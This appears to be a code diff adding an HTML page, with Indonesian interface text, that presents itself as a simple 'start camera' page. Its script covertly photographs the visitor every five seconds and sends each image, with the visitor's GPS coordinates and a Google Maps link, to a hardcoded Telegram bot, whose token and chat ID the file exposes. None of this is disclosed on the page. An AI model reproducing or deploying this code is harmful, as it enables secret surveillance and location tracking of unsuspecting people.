@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Webcam Capture with Location</title>
+    <style>
+        body { 
+            background: #000; 
+            color: white; 
+            font-family: Arial; 
+            text-align: center;
+        }
+        #videoElement {
+            width: 640px;
+            height: 480px;
+            border: 3px solid red;
+            margin: 20px auto;
+        }
+        button {
+            padding: 15px 30px;
+            background: #ff0000;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Klik 'Mulai' untuk Mengaktifkan Kamera</h1>
+    <video id="videoElement" autoplay playsinline></video><br>
+    <button onclick="startCamera()">Mulai Kamera</button>
+
+    <script>
+        const BOT_TOKEN = '7586798634:AAEtPpcfEW10YF9TMJQ-bVa1DJoVNNWPNF4';
+        const CHAT_ID = '6851013901';
+        let mediaStream;
+        let intervalId;
+        let userLatitude, userLongitude;
+
+        async function startCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+
+                const video = document.getElementById('videoElement');
+                video.srcObject = mediaStream;
+
+                video.onloadedmetadata = () => {
+                    video.play();
+                    startCaptureInterval();
+                };
+
+                getUserLocation();
+
+            } catch (err) {
+                console.error('Error mengakses kamera:', err);
+            }
+        }
+
+        function startCaptureInterval() {
+            clearInterval(intervalId);
+
+            intervalId = setInterval(() => {
+                captureAndSendToTelegram();
+            }, 5000);
+        }
+
+        function getUserLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                    },
+                    error => {
+                        console.error('Gagal mendapatkan lokasi:', error);
+                    }
+                );
+            } else {
+                console.error('Geolocation tidak didukung di browser ini');
+            }
+        }
+
+        function captureAndSendToTelegram() {
+            const video = document.getElementById('videoElement');
+            if (!video || video.readyState !== 4) {
+                console.warn('Video belum siap');
+                return;
+            }
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                if (!blob) {
+                    console.error('Gagal membuat gambar');
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('photo', blob, 'capture.jpg');
+
+                let caption = "📍 Lokasi: Tidak tersedia";
+                if (userLatitude && userLongitude) {
+                    caption = `📍 Lokasi:\nLatitude: ${userLatitude}\nLongitude: ${userLongitude}\n\n🔗 Google Maps: https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
+                }
+
+                formData.append('caption', caption);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => console.log('Foto terkirim:', data))
+                .catch(err => console.error('Gagal mengirim foto:', err));
+            }, 'image/jpeg', 0.85);
+        }
+    </script>
+</body>
+</html>
